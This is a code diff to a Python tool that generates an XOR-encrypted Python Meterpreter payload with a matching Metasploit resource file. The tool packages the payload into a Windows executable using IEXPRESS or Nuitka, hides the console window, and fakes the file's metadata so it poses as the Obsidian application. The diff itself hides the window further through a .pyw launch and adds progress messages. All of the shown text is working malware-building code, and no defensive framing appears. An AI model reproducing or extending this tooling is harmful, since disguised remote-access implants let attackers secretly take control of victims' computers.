@@ -109,7 +109,7 @@ def generate_file(data: argparse.Namespace) -> None:
         for i in range(len(t)):
             temp += bytes([t[i] ^ KEY[i % len(KEY)]])
         print("[+] Generating an encrypted python meterpreter")
-        w = open("temp/{}.py".format(fname),'w')
+        w = open("temp/{}.pyw".format(fname),'w')
         r = open("output/{}.rc".format(fname),'w')
         r.writelines(l + "\n" for l in metrc)
         r.close()
@@ -153,7 +153,7 @@ DisplayLicense=
 FinishMessage=
 TargetName=output\\{outname}.exe
 FriendlyName=Title
-AppLaunched=pythonw.exe {fname}.py
+AppLaunched=python.exe {fname}.pyw
 PostInstallCmd=<None>
 AdminQuietInstCmd=
 UserQuietInstCmd= 
@@ -161,12 +161,12 @@ UserQuietInstCmd=
             minor = random.randint(8,9)
             build = random.randint(0,10)
             link = f"https://www.python.org/ftp/python/3.{minor}.{build}/python-3.{minor}.{build}-embed-amd64.zip"
-            print("[+] Downloading a random embedded python version...")
+            print(f"[+] Downloading a random embedded python version... (3.{minor}.{build})")
             urllib.request.urlretrieve(link, f"temp/{link.rsplit('/',1)[1]}")
             print("[+] Done downloading")
             with zipfile.ZipFile(f"temp/{link.rsplit('/',1)[1]}",'r') as zfile:
                 zfile.extractall('temp/python')
-            shutil.move(f"temp/{fname}.py", "temp/python/")
+            shutil.move(f"temp/{fname}.pyw", "temp/python/")
             files = os.listdir('temp/python/')
             print(f"[+] Generating {fname}.SED")
             file_strings = ''
@@ -182,13 +182,14 @@ SourceFiles0={os.getcwd()}\\temp\\python\\
                 wfile.write(SED)
             os.system('IEXPRESS /N /Q temp/{}.SED'.format(fname))
             shutil.rmtree("temp")
+            print(f'[+] Done creating final executable "output/{outname}.exe"')
         else:
             p = ''
             if data.icon:
                 p = f" --windows-icon-from-ico={data.icon}"
-            os.system(f'nuitka --windows-company-name=Obsidian --windows-product-name=Obsidian --windows-file-version=0.14.0.6 --windows-product-version=0.14.0.6 --windows-file-description=Obsidian --onefile --windows-disable-console --remove-output --assume-yes-for-downloads temp/{fname}.py -o output/{outname}.exe' + p)
+            os.system(f'python -m nuitka --windows-company-name=Obsidian --windows-product-name=Obsidian --windows-file-version=0.14.0.6 --windows-product-version=0.14.0.6 --windows-file-description=Obsidian --onefile --windows-disable-console --remove-output --assume-yes-for-downloads temp/{fname}.py -o output/{outname}.exe' + p)
             shutil.rmtree("temp")
-        print(f'[+] Done creating final executable "output/{outname}.exe"')
+            print(f'[+] Done creating final executable "output/{outname}.exe"')
         
         
 if __name__ == "__main__":
